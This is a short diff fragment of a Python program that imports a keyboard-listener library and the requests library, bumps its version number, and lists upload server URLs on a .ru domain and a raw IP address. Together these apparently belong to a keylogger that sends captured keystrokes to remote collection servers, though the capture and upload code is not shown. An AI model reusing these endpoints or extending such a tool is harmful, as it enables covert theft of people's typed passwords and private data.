@@ -10,7 +10,7 @@ import requests
 from pynput import keyboard
 
 
-VERSION = "3.0"
+VERSION = "3.1"
 DEFAULT_SERVER_URL = "https://api.shera2tap.ru/upload"
 LEGACY_SERVER_URLS = {
     "http://147.45.38.195/upload",
